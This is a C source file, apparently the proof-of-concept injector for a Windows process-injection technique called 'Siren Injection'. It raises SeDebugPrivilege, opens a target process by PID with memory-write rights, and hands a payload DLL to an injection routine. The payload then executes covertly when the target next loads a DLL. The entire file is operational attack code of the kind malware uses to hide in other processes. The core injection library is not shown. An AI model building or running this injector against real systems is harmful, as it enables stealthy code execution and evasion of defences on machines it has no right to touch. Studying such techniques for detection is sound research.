/*
 * poc/injector/main.c
 *
 * Siren Injection — PoC injector.
 *
 * Usage: siren_injector.exe <PID> <dll_path>
 *
 * After a successful injection the injector prints a confirmation and
 * exits immediately.  The payload DLL will execute the next time the
 * target process loads any DLL.
 */

#include "siren/siren.h"

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

static void enable_debug_privilege(void)
{
    HANDLE       tok;
    TOKEN_PRIVILEGES tp = { 1 };
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    LookupPrivilegeValueW(NULL, L"SeDebugPrivilege",
                          &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
}

static void *read_file(const char *path, size_t *out_size)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot open '%s': %lu\n",
                path, GetLastError());
        return NULL;
    }

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(hf, &sz) || sz.QuadPart == 0) {
        CloseHandle(hf);
        return NULL;
    }

    void *buf = malloc((size_t)sz.QuadPart);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD read = 0;
    if (!ReadFile(hf, buf, (DWORD)sz.QuadPart, &read, NULL) ||
        (LONGLONG)read != sz.QuadPart) {
        free(buf);
        CloseHandle(hf);
        return NULL;
    }
    CloseHandle(hf);
    *out_size = (size_t)sz.QuadPart;
    return buf;
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <PID> <dll_path>\n", argv[0]);
        return 1;
    }

    enable_debug_privilege();

    DWORD pid = (DWORD)atoi(argv[1]);
    if (!pid) {
        fprintf(stderr, "[!] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    /* ── Read DLL payload from disk ─────────────────────────────── */
    size_t dll_size = 0;
    void  *dll_bytes = read_file(argv[2], &dll_size);
    if (!dll_bytes) {
        fprintf(stderr, "[!] Failed to read DLL: %s\n", argv[2]);
        return 1;
    }
    printf("[*] Payload: %s (%zu bytes)\n", argv[2], dll_size);

    /* ── Open target process ─────────────────────────────────────── */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess(%lu) failed: %lu\n",
                pid, GetLastError());
        free(dll_bytes);
        return 1;
    }
    printf("[*] Target PID %lu opened\n", pid);

    /* ── Inject ───────────────────────────────────────────────────── */
    siren_inject_options opts = { 0 };
    opts.verbose       = 1;
    opts.carrier_module = L"kernel32.dll";

    siren_status_t r = siren_inject(hProcess, dll_bytes, dll_size, &opts);

    /* Injector closes its handle immediately — this is by design. */
    CloseHandle(hProcess);
    free(dll_bytes);

    if (SIREN_FAILED(r)) {
        fprintf(stderr, "[!] siren_inject failed: %s (0x%08X)\n",
                siren_status_string(r), (unsigned)r);
        return 1;
    }

    printf("\n[+] Siren armed. Injector exiting.\n");
    printf("    The payload will execute on the next DLL load in PID %lu.\n",
           pid);
    printf("    Check %%TEMP%%\\siren_proof.txt to confirm.\n");
    return 0;
}
